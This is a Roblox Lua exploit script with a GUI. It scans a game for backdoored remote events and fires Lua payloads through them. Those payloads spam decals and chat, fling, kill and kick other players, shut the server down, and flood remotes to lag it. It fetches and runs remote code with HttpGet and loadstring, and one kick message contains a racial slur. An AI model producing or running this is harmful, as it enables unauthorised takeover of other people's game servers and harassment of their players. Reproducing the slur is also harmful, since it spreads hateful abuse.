local LogService = game:GetService("LogService")
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Sheldoni_Premium_Edition"
ScreenGui.ResetOnSpawn = false
pcall(function()
ScreenGui.Parent = game:GetService("CoreGui")
end)
if not ScreenGui.Parent then
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
end
local function makeDraggable(frame)
local dragging, dragInput, dragStart, startPos
frame.InputBegan:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
dragging = true
dragStart = input.Position
startPos = frame.Position
input.Changed:Connect(function()
if input.UserInputState == Enum.UserInputState.End then
dragging = false
end
end)
end
end)
frame.InputChanged:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
dragInput = input
end
end)
UserInputService.InputChanged:Connect(function(input)
if input == dragInput and dragging then
local delta = input.Position - dragStart
frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end
end)
end
local OpenButton = Instance.new("TextButton")
OpenButton.Size = UDim2.new(0, 100, 0, 35)
OpenButton.Position = UDim2.new(0, 10, 0, 10)
OpenButton.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
OpenButton.BorderSizePixel = 1
OpenButton.BorderColor3 = Color3.fromRGB(200, 200, 200)
OpenButton.Text = "Open Sheldon"
OpenButton.TextColor3 = Color3.fromRGB(0, 0, 0)
OpenButton.Font = Enum.Font.SourceSans
OpenButton.TextSize = 14
OpenButton.Visible = false
OpenButton.Parent = ScreenGui
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 560, 0, 260)
MainFrame.Position = UDim2.new(0.5, -280, 0.5, -130)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BackgroundTransparency = 0.2
MainFrame.BorderSizePixel = 1
MainFrame.BorderColor3 = Color3.fromRGB(180, 180, 180)
MainFrame.Active = true
MainFrame.Visible = true
MainFrame.Parent = ScreenGui
makeDraggable(MainFrame)
local SheldonBackground = Instance.new("ImageLabel")
SheldonBackground.Size = UDim2.new(1, 0, 1, -40)
SheldonBackground.Position = UDim2.new(0, 0, 0, 40)
SheldonBackground.Image = "rbxassetid://14902240136"
SheldonBackground.ImageTransparency = 0.5
SheldonBackground.BackgroundTransparency = 1
SheldonBackground.ScaleType = Enum.ScaleType.Stretch
SheldonBackground.ZIndex = 1
SheldonBackground.Parent = MainFrame
local ScrollFrame = Instance.new("ScrollingFrame")
ScrollFrame.Size = UDim2.new(1, -20, 1, -50)
ScrollFrame.Position = UDim2.new(0, 10, 0, 40)
ScrollFrame.BackgroundTransparency = 1
ScrollFrame.BorderSizePixel = 0
ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 300)
ScrollFrame.ScrollBarThickness = 6
ScrollFrame.ZIndex = 2
ScrollFrame.Parent = MainFrame
local ScrollGrid = Instance.new("UIGridLayout")
ScrollGrid.CellSize = UDim2.new(0, 170, 0, 35)
ScrollGrid.CellPadding = UDim2.new(0, 12, 0, 10)
ScrollGrid.SortOrder = Enum.SortOrder.LayoutOrder
ScrollGrid.Parent = ScrollFrame
ScrollGrid:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, ScrollGrid.AbsoluteContentSize.Y + 20)
end)
local TopBar = Instance.new("Frame")
TopBar.Size = UDim2.new(1, 0, 0, 30)
TopBar.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
TopBar.BorderSizePixel = 1
TopBar.BorderColor3 = Color3.fromRGB(210, 210, 210)
TopBar.ZIndex = 2
TopBar.Parent = MainFrame
local UIListLayoutTop = Instance.new("UIListLayout")
UIListLayoutTop.FillDirection = Enum.FillDirection.Horizontal
UIListLayoutTop.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayoutTop.Padding = UDim.new(0, 8)
UIListLayoutTop.Parent = TopBar
local TopPadding = Instance.new("UIPadding")
TopPadding.PaddingLeft = UDim.new(0, 6)
TopPadding.Parent = TopBar
local function createTopTab(text, size, callback)
local tab = Instance.new("TextButton")
tab.Size = size
tab.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
tab.BorderSizePixel = 1
tab.BorderColor3 = Color3.fromRGB(210, 210, 210)
tab.Text = text
tab.TextColor3 = Color3.fromRGB(0, 0, 0)
tab.Font = Enum.Font.SourceSans
tab.TextSize = 13
tab.ZIndex = 3
tab.Parent = TopBar
tab.MouseButton1Click:Connect(callback)
return tab
end
local function createMainButton(text, callback)
local btn = Instance.new("TextButton")
btn.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
btn.BorderSizePixel = 1
btn.BorderColor3 = Color3.fromRGB(200, 200, 200)
btn.Text = text
btn.TextColor3 = Color3.fromRGB(0, 0, 0)
btn.Font = Enum.Font.SourceSans
btn.TextSize = 14
btn.ZIndex = 3
btn.Parent = ScrollFrame
btn.MouseButton1Click:Connect(callback)
return btn
end
local BackdoorKeywords = {"vibe", "server", "execute", "run", "control", "admin", "hd", "khols", "mod", "owner", "main"}
local FoundRemotes = {}
local TargetImage = "rbxassetid://14902240136"
local DecalSpam2Image = "rbxassetid://88382246725231"
local DecalSpam3Image = "rbxassetid://10427371074"
local TargetAudio = "rbxassetid://18728158453"
local SetSkybox2Image = "rbxassetid://157755295"
local SetSkybox3Image = "rbxassetid://136055162054954"
local Music2Audio = "rbxassetid://122542000297473"
local JumpscareAudio = "rbxassetid://9069609268"
local IsLagging = false
local Flying = false
local Invisible = false
local function executePayload(payloadCode)
local vLuaEnvironment = [[
local script = Instance.new("Script")
local loadstring = function(source)
local success, chunk = pcall(function()
return game:HttpGet("githubusercontent.com")
end)
if success then
local vLuau = loadstring(chunk)()
return vLuau(source, getfenv())
else
local fallback = game:HttpGet("githubusercontent.com")
return loadstring(fallback)()(source, getfenv())
end
end
]]
local completePayload = vLuaEnvironment .. "\n" .. payloadCode
if #FoundRemotes > 0 then
for _, remote in pairs(FoundRemotes) do
pcall(function()
if remote:IsA("RemoteEvent") then
remote:FireServer(completePayload)
remote:FireServer("Execute", completePayload)
remote:FireServer("require", completePayload)
elseif remote:IsA("RemoteFunction") then
remote:InvokeServer(completePayload)
end
end)
end
else
local success, func = pcall(loadstring, completePayload)
if success and func then pcall(func) end
end
end
createTopTab("Sheldoni Gui", UDim2.new(0, 80, 1, 0), function()
FoundRemotes = {}
for _, obj in pairs(game:GetDescendants()) do
if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
local nameLower = string.lower(obj.Name)
for _, keyword in pairs(BackdoorKeywords) do
if string.find(nameLower, keyword) then
table.insert(FoundRemotes, obj)
end
end
end
end
end)
createTopTab("Close", UDim2.new(0, 45, 1, 0), function()
MainFrame.Visible = false
OpenButton.Visible = true
end)
OpenButton.MouseButton1Click:Connect(function()
MainFrame.Visible = true
OpenButton.Visible = false
end)
local function runDecalSpam()
executePayload([[for _,v in pairs(workspace:GetDescendants()) do if v:IsA("Decal") and v.Name == "SheldoniSpam" then v:Destroy() end end for _,v in pairs(workspace:GetDescendants()) do if v:IsA("BasePart") then local faces = {Enum.NormalId.Top, Enum.NormalId.Bottom, Enum.NormalId.Left, Enum.NormalId.Right, Enum.NormalId.Front, Enum.NormalId.Back} for _,face in pairs(faces) do local d = Instance.new("Decal", v) d.Name = "SheldoniSpam" d.Texture = "]] .. TargetImage .. [[" d.Face = face end end end]])
end
local function runDecalSpam2()
executePayload([[for _,v in pairs(workspace:GetDescendants()) do if v:IsA("Decal") and v.Name == "SheldoniSpam" then v:Destroy() end end for _,v in pairs(workspace:GetDescendants()) do if v:IsA("BasePart") then local faces = {Enum.NormalId.Top, Enum.NormalId.Bottom, Enum.NormalId.Left, Enum.NormalId.Right, Enum.NormalId.Front, Enum.NormalId.Back} for _,face in pairs(faces) do local d = Instance.new("Decal", v) d.Name = "SheldoniSpam" d.Texture = "]] .. DecalSpam2Image .. [[" d.Face = face end end end]])
end
local function runDecalSpam3()
executePayload([[for _,v in pairs(workspace:GetDescendants()) do if v:IsA("Decal") and v.Name == "SheldoniSpam" then v:Destroy() end end for _,v in pairs(workspace:GetDescendants()) do if v:IsA("BasePart") then local faces = {Enum.NormalId.Top, Enum.NormalId.Bottom, Enum.NormalId.Left, Enum.NormalId.Right, Enum.NormalId.Front, Enum.NormalId.Back} for _,face in pairs(faces) do local d = Instance.new("Decal", v) d.Name = "SheldoniSpam" d.Texture = "]] .. DecalSpam3Image .. [[" d.Face = face end end end]])
end
local function runSetSkybox()
executePayload([[for _,v in pairs(game.Lighting:GetChildren()) do if v:IsA("Sky") then v:Destroy() end end local s = Instance.new("Sky", game:GetService("Lighting")) s.SkyboxBk = "]] .. TargetImage .. [[" s.SkyboxDn = "]] .. TargetImage .. [[" s.SkyboxFt = "]] .. TargetImage .. [[" s.SkyboxLf = "]] .. TargetImage .. [[" s.SkyboxRt = "]] .. TargetImage .. [[" s.SkyboxUp = "]] .. TargetImage .. [[" ]])
end
local function runSetSkybox2()
executePayload([[for _,v in pairs(game.Lighting:GetChildren()) do if v:IsA("Sky") then v:Destroy() end end local s = Instance.new("Sky", game:GetService("Lighting")) s.SkyboxBk = "]] .. SetSkybox2Image .. [[" s.SkyboxDn = "]] .. SetSkybox2Image .. [[" s.SkyboxFt = "]] .. SetSkybox2Image .. [[" s.SkyboxLf = "]] .. SetSkybox2Image .. [[" s.SkyboxRt = "]] .. SetSkybox2Image .. [[" s.SkyboxUp = "]] .. SetSkybox2Image .. [[" ]])
end
local function runSetSkybox3()
executePayload([[for _,v in pairs(game.Lighting:GetChildren()) do if v:IsA("Sky") then v:Destroy() end end local s = Instance.new("Sky", game:GetService("Lighting")) s.SkyboxBk = "]] .. SetSkybox3Image .. [[" s.SkyboxDn = "]] .. SetSkybox3Image .. [[" s.SkyboxFt = "]] .. SetSkybox3Image .. [[" s.SkyboxLf = "]] .. SetSkybox3Image .. [[" s.SkyboxRt = "]] .. SetSkybox3Image .. [[" s.SkyboxUp = "]] .. SetSkybox3Image .. [[" ]])
end
local function runMusic1()
executePayload([[for _,v in pairs(workspace:GetChildren()) do if v.Name == "SheldoniMusic" then v:Destroy() end end local s = Instance.new("Sound", workspace) s.Name = "SheldoniMusic" s.SoundId = "]] .. TargetAudio .. [[" s.Volume = 10 s.Looped = true s:Play()]])
end
local function runMusic2()
executePayload([[for _,v in pairs(workspace:GetChildren()) do if v.Name == "SheldoniMusic" then v:Destroy() end end local s = Instance.new("Sound", workspace) s.Name = "SheldoniMusic" s.SoundId = "]] .. Music2Audio .. [[" s.Volume = 10 s.TimePosition = 18.7 s.Looped = true s:Play() spawn(function() while s.Parent do if s.TimePosition >= 117 then s.TimePosition = 18.7 end task.wait(0.1) end end)]])
end
local function runScatterParticles()
executePayload([[for _,v in pairs(game.Players:GetPlayers()) do if v.Character and v.Character:FindFirstChild("HumanoidRootPart") then local p = Instance.new("ParticleEmitter", v.Character.HumanoidRootPart) p.Texture = "]] .. TargetImage .. [[" p.Rate = 55 p.Speed = NumberRange.new(10, 20) p.Lifetime = NumberRange.new(2.5, 4.5) p.VelocitySpread = 360 p.SpreadAngle = Vector2.new(-180, 180) end end]])
end
local function runJumpscare()
executePayload([[for _, p in pairs(game.Players:GetPlayers()) do pcall(function() local gui = Instance.new("ScreenGui", p:WaitForChild("PlayerGui")) gui.Name = "SheldonJump" local imgLabel = Instance.new("ImageLabel", gui) imgLabel.Size = UDim2.new(1, 0, 1, 0) imgLabel.Image = "]] .. TargetImage .. [[" imgLabel.ZIndex = 999999 local s = Instance.new("Sound", workspace) s.SoundId = "]] .. JumpscareAudio .. [[" s.Volume = 10 s:Play() game:GetService("Debris"):AddItem(gui, 2.5) end) end]])
end
local function runChatSpam()
executePayload([[spawn(function() while task.wait(0.5) do for _, v in pairs(game.Players:GetPlayers()) do pcall(function() game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("BAZINGA! Sheldon Owns This Server!", "All") end) end end end)]])
end
local function runDoomLighting()
executePayload([[game.Lighting.Ambient = Color3.fromRGB(255, 0, 0) game.Lighting.ClockTime = 0 game.Lighting.OutdoorAmbient = Color3.fromRGB(0, 0, 0)]])
end
local function runButton666()
executePayload([[game.Lighting.Ambient = Color3.fromRGB(255, 0, 0) game.Lighting.OutdoorAmbient = Color3.fromRGB(150, 0, 0) game.Lighting.ClockTime = 0 for _, v in pairs(workspace:GetDescendants()) do if v:IsA("BasePart") and math.random(1, 3) == 1 then local f = Instance.new("Fire", v) f.Size = 30 f.Heat = 25 end end]])
end
local function runFlingOthers()
executePayload([[local lp = game.Players.LocalPlayer for _, p in pairs(game.Players:GetPlayers()) do if p ~= lp and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then pcall(function() local bV = Instance.new("BodyVelocity", p.Character.HumanoidRootPart) bV.MaxForce = Vector3.new(1,1,1) * math.huge bV.Velocity = Vector3.new(math.random(-500, 500), math.random(500, 1000), math.random(-500, 500)) end) end end]])
end
local function runKickOthers()
executePayload([[for _, p in pairs(game.Players:GetPlayers()) do if p ~= game.Players.LocalPlayer then p:Kick("Sc0rPoin Kick you out Nigars !BAZINGA") end end]])
end
local function runServerShutdown()
executePayload([[for _, p in pairs(game.Players:GetPlayers()) do p:Kick("HELLO DEV SHELDONI GUI CAN DO ANYTHING") end]])
end
local function runGlitchHint()
executePayload([[for _, p in pairs(game.Players:GetPlayers()) do pcall(function() local phrases = {"S$CorPion ## is h-er?", "SHELDON DETECTED...", "SYSTEM BREACHED!!", "BAZINGA SYSTEM v2", "NO ESCAPE FOR YOU"} local h = p.PlayerGui:FindFirstChild("SheldoniHint") or Instance.new("Hint", p.PlayerGui) h.Name = "SheldoniHint" spawn(function() while task.wait(0.1) do h.Text = phrases[math.random(1, #phrases)] end end) end) end]])
end
local function runServerMsg()
executePayload([[for _, p in pairs(game.Players:GetPlayers()) do pcall(function() local msgs = {"Sheldon says: Smart people don't need luck.", "Roblox Security is a complete joke.", "This map protection was bypassed in 0.2 seconds.", "Bazinga! Your server belongs to Sheldon now.", "Imagine paying for anti-cheat in 2026."} local m = p.PlayerGui:FindFirstChild("SheldoniMsg") or Instance.new("Message", p.PlayerGui) m.Name = "SheldoniMsg" spawn(function() while true do m.Text = msgs[math.random(1, #msgs)] task.wait(3) end end) end) end]])
end
local function runGiveSword()
executePayload([[local p = game.Players.LocalPlayer if p.Character then local tool = Instance.new("Tool") tool.Name = "God Kill Sword" tool.RequiresHandle = true local handle = Instance.new("Part", tool) handle.Name = "Handle" handle.Size = Vector3.new(1, 4, 1) handle.Color = Color3.fromRGB(255, 0, 0) tool.Parent = p.Backpack tool.Activated:Connect(function() for _, v in pairs(game.Players:GetPlayers()) do if v ~= p and v.Character and v.Character:FindFirstChild("Humanoid") then pcall(function() v.Character.Humanoid.Health = 0 end) end end end) end]])
end
local function runSpeed50()
if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
LocalPlayer.Character.Humanoid.WalkSpeed = 50
end
end
local function runFly()
Flying = not Flying
if Flying then
local c = LocalPlayer.Character
if c and c:FindFirstChild("HumanoidRootPart") then
local hrp = c.HumanoidRootPart
local bg = Instance.new("BodyGyro", hrp)
bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
bg.cframe = hrp.CFrame
local bv = Instance.new("BodyVelocity", hrp)
bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
bv.velocity = Vector3.new(0,0.1,0)
task.spawn(function()
while Flying and c.Parent do
local cam = workspace.CurrentCamera.CFrame
local vel = Vector3.new(0,0.1,0)
if UserInputService:IsKeyDown(Enum.KeyCode.W) then vel = vel + cam.LookVector * 100 end
if UserInputService:IsKeyDown(Enum.KeyCode.S) then vel = vel - cam.LookVector * 100 end
if UserInputService:IsKeyDown(Enum.KeyCode.A) then vel = vel - cam.RightVector * 100 end
if UserInputService:IsKeyDown(Enum.KeyCode.D) then vel = vel + cam.RightVector * 100 end
bv.velocity = vel
bg.cframe = cam
task.wait()
end
bg:Destroy()
bv:Destroy()
end)
end
end
end
local function runInvisible()
Invisible = not Invisible
local c = LocalPlayer.Character
if c then
for _, v in pairs(c:GetDescendants()) do
if v:IsA("BasePart") or v:IsA("Decal") then
v.Transparency = Invisible and 1 or 0
end
end
end
end
local function runServerLag()
IsLagging = not IsLagging
if IsLagging then
task.spawn(function()
while IsLagging do
for _, obj in pairs(game:GetDescendants()) do
if obj:IsA("RemoteEvent") then
pcall(function() obj:FireServer(string.rep("BAZINGA", 500)) end)
elseif obj:IsA("RemoteFunction") then
task.spawn(function() pcall(function() obj:InvokeServer(string.rep("BAZINGA", 500)) end) end)
end
end
task.wait(0.01)
end
end)
end
end
createMainButton("Decal Spam", runDecalSpam)
createMainButton("Decal Spam 2", runDecalSpam2)
createMainButton("Decal Spam 3", runDecalSpam3)
createMainButton("Set Skybox", runSetSkybox)
createMainButton("Set Skybox 2", runSetSkybox2)
createMainButton("Set Skybox 3", runSetSkybox3)
createMainButton("Music 1", runMusic1)
createMainButton("Music 2 (Hardtekk)", runMusic2)
createMainButton("Scatter Particles", runScatterParticles)
createMainButton("Sheldon Jumpscare", runJumpscare)
createMainButton("Chat Spam", runChatSpam)
createMainButton("Doom Lighting", runDoomLighting)
createMainButton("Button 666", runButton666)
createMainButton("Fling Others", runFlingOthers)
createMainButton("Kick Others", runKickOthers)
createMainButton("Server ShutDown", runServerShutdown)
createMainButton("Glitch Hint", runGlitchHint)
createMainButton("Server Message", runServerMsg)
createMainButton("Give Sword", runGiveSword)
createMainButton("Speed 50", runSpeed50)
createMainButton("Toggle Fly", runFly)
createMainButton("Toggle Invisible", runInvisible)
createMainButton("Server Lag", runServerLag)
